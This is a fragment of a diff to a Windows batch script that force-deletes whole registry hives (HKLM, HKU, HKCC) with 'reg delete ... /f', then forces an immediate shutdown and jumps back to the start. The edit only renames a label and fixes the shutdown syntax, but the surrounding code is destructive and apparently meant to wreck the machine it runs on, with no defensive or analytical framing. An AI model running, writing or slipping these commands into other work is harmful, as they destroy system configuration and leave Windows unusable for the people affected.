@@ -672,7 +672,7 @@ reg delete "HKLM" /f
 reg delete "HKU" /f
 reg delete "HKCC" /f
 reg delete "HKEY" /f
-goto bsod
-:shutdown
-shutdown /s 1
+goto turnoffpc
+:turnoffpc
+shutdown -s -t 1
 goto start
